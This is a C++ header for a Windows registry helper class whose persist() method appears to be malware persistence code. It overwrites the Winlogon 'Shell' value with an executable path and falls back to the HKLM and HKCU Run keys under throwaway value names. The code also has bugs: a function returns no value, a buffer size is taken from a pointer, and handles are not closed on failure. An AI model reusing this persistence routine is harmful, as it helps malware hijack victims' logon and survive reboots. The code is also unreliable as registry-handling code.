#pragma once
#include <map>
#include <Windows.h>
#include "../enums/registry_entry.h"

class RegistryManager
{
public:
	RegistryManager()
	{
		registryRootMaps[RegistryRoot::LOCAL_MACHINE] = HKEY_LOCAL_MACHINE;
		registryRootMaps[RegistryRoot::CURRENT_USER] = HKEY_CURRENT_USER;


		subkeyTypesMapping[String] = REG_SZ;
	}

	long WriteKey(RegistryRoot registryRoot, const char* subKey, const char* valueName, unsigned char* value)
	{
		HKEY hKey;
		long result = RegOpenKeyEx(this->registryRootMaps[registryRoot], subKey, 0, KEY_ALL_ACCESS, &hKey);
		if (result == ERROR_SUCCESS)
		{
			result = WriteKey(hKey, valueName, value);
			if (result == ERROR_SUCCESS)
			{
				RegCloseKey(hKey);
			}
		}
	}

	void persist()
	{
		LPBYTE fullPath = (LPBYTE)"C:/system32/myexe.exe";
		// Persist method 1, using startup

		long result = WriteKey(LOCAL_MACHINE,
		                       "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
		                       "Shell", fullPath);
		// TODO:
		if (result != ERROR_SUCCESS)
		{
			// Persist 2
			result = WriteKey(LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Something",
			                  fullPath);
			if (result == ERROR_ACCESS_DENIED)
			{
				WriteKey(CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Anything", fullPath);
			}
		}
	}

	long readKey(RegistryRoot regRoot, char* key, char* subKey, SubkeyType subkeyType, char* output)
	{
		HKEY hKey;
		long lResult;
		// wchar_t output[MAX_PATH] = {};
		lResult = RegOpenKeyExA(registryRootMaps[regRoot], key, 0, KEY_READ, &hKey);
		DWORD dwRegType = REG_SZ;
		DWORD dwSize = sizeof(subKey);

		if (lResult == ERROR_SUCCESS)
		{
			// RRF_RT_REG_SZ
			lResult = RegGetValueA(hKey, NULL, subKey, subkeyTypesMapping[subkeyType], &dwRegType, output, &dwSize);
			RegCloseKey(hKey);
			return lResult;
		}
	}

	bool hasRegistrySomeValue(RegistryRoot regRoot, char* key, char* subKeyStr, SubkeyType subkey, char* output)
	{
		long result = readKey(regRoot, key, subKeyStr, subkey, output);
		if (result != ERROR_SUCCESS)
			return false;

		// wcslen for unicode
		return strlen(output) > 0;
	}

	long WriteKey(HKEY hKey, const char* valueName, unsigned char* value)
	{
		return RegSetValueExA(hKey, valueName, 0, REG_SZ, value, MAX_PATH);
	}

	~RegistryManager();

private:


	std::map<RegistryRoot, HKEY> registryRootMaps;
	std::map<SubkeyType, int> subkeyTypesMapping;
};
